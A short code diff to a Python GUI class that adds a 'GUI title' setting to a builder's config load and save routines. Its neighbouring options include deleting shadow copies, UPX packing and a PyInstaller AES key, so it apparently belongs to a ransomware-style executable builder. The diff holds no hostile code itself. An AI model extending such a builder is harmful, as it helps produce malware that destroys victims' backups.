@@ -112,6 +112,11 @@ class Gui(MainFrame):
             self.UpxDirPicker.SetPath(config_dict["upx_dir"])
         else:
             self.UpxDirPicker.SetPath("")
+        # GUI Title
+        if "gui_title" in config_dict:
+            self.GuiTitleTextCtrl.SetValue(config_dict["gui_title"])
+        else:
+            self.GuiTitleTextCtrl.SetValue("")
         # Delete Shadow Copies
         if "delete_shadow_copies" in config_dict:
             if config_dict["delete_shadow_copies"]:
@@ -403,6 +408,8 @@ class Gui(MainFrame):
         user_input_dict["pyinstaller_aes_key"] = self.PyInstallerAesKeyTextCtrl.GetValue()
         # Icon FIle
         user_input_dict["icon_file"] = self.IconFilePicker.GetPath()
+        # GUI Title
+        user_input_dict["gui_title"] = self.GuiTitleTextCtrl.GetValue()
         # UPX Packer Dir
         user_input_dict["upx_dir"] = self.UpxDirPicker.GetPath()
         # Delete Shadow Copies
